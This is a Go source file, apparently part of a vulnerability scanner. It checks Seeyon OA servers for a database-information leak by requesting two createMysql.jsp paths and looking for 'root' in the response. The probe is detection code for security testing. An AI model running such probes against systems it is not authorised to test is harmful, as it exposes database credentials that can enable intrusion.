package seeyon

import (
	"github.com/yhy0/Jie/pkg/protocols/http"
	"strings"
)

//createMysql.jsp 数据库敏感信息泄

func CreateMysql(u string) bool {
	if req, err := http.Request(u+"/yyoa/createMysql.jsp", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "root") {
			return true
		}
	}
	if req, err := http.Request(u+"/yyoa/ext/createMysql.jsp", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "root") {
			return true
		}
	}
	return false
}
